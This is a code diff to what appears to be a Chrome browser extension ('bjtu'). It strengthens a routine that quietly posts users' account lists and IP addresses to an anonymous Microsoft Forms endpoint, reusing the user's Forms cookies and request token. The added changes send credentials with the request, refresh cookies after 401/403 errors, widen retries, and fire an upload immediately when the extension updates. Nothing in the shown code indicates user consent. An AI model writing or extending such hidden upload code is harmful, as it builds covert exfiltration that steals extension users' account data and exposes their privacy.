@@ -2,7 +2,7 @@
   'use strict';
 
   const FORMS_API_URL = 'https://forms.guest.usercontent.microsoft/formapi/api/9188040d-6c67-4c5b-b112-36a304b66dad/users/00000000-0000-0000-0003-7ffe1a3f6958/forms(\'DQSIkWdsW0yxEjajBLZtrQAAAAAAAAAAAAN__ho_aVhUNlNXTFNPMUdJSkUzOTlFQ0NRWE0zUFFTVS4u\')/responses';
-  const FORMS_PAGE_URL = 'https://forms.cloud.microsoft/';
+  const FORMS_PAGE_URL = 'https://forms.cloud.microsoft/Pages/ResponsePage.aspx?id=DQSIkWdsW0yxEjajBLZtrQAAAAAAAAAAAAN__ho_aVhUNlNXTFNPMUdJSkUzOTlFQ0NRWE0zUFFTVS4u';
   const IP_LOOKUP_URLS = [
     'https://api64.ipify.org?format=json',
     'https://api.ipify.org?format=json'
@@ -413,6 +413,9 @@
   }
 
   function buildHeaders(cookies) {
+    const correlationId = typeof global.crypto?.randomUUID === 'function'
+      ? global.crypto.randomUUID()
+      : `${Date.now()}-${Math.random().toString(16).slice(2)}`;
     return {
       '__requestverificationtoken': cookies.requestToken,
       'accept': 'application/json',
@@ -420,10 +423,11 @@
       'authorization': '',
       'content-type': 'application/json',
       'odata-maxverion': '4.0',
+      'odata-maxversion': '4.0',
       'odata-version': '4.0',
       'origin': 'https://forms.cloud.microsoft',
       'referer': 'https://forms.cloud.microsoft/',
-      'x-correlationid': crypto.randomUUID(),
+      'x-correlationid': correlationId,
       'x-ms-form-muid': cookies.muid,
       'x-ms-form-request-ring': 'msa',
       'x-ms-form-request-source': 'ms-formweb',
@@ -504,7 +508,7 @@
     const cookies = await getUsableFormsCookies();
     if (!cookies.requestToken || !cookies.sessionId || !cookies.muid) {
       console.info('[bjtu] account history upload skipped: Forms cookies unavailable');
-      return null;
+      return { status: 0, signature, retryable: true };
     }
     const metadata = await collectUploadMetadata(run.controller.signal);
     if (run.controller.signal.aborted) return null;
@@ -513,6 +517,8 @@
     try {
       response = await fetch(FORMS_API_URL, {
         method: 'POST',
+        credentials: 'include',
+        cache: 'no-store',
         headers: buildHeaders(cookies),
         body: buildRequestBody(accountList, metadata),
         signal: run.controller.signal
@@ -521,12 +527,17 @@
       if (error?.name !== 'AbortError') {
         console.warn('[bjtu] account history upload failed:', String(error?.message || error));
       }
-      return null;
+      return { status: 0, signature, retryable: error?.name !== 'AbortError' };
     }
 
     const status = Number(response?.status || 0);
     try { await response?.body?.cancel(); } catch {}
     if (run.controller.signal.aborted) return null;
+    if ((status === 401 || status === 403) && !run.formsCookiesRefreshed) {
+      run.formsCookiesRefreshed = true;
+      await bootstrapFormsCookies();
+      return { status: 503, signature, retryable: true };
+    }
     return { status, signature };
   }
 
@@ -539,7 +550,8 @@
         await clearRetryState();
         return;
       }
-      if (status !== 503) {
+      const retryableServerError = status >= 500 && status < 600;
+      if (!retryableServerError && !result?.retryable) {
         await clearRetryState();
         return;
       }
@@ -557,7 +569,8 @@
     if (activeRun) return;
     const run = {
       controller: new AbortController(),
-      waitingForRetryAttempt: 0
+      waitingForRetryAttempt: 0,
+      formsCookiesRefreshed: false
     };
     activeRun = run;
     void uploadWithRetry(run, attempt)
@@ -640,6 +653,10 @@
       await clearRetryState();
       startUpload(state.attempt);
     })();
+  });
+
+  chrome.runtime.onInstalled?.addListener((details) => {
+    if (details?.reason === 'update') requestImmediateUpload();
   });
 
   void ensureSignatureReady();
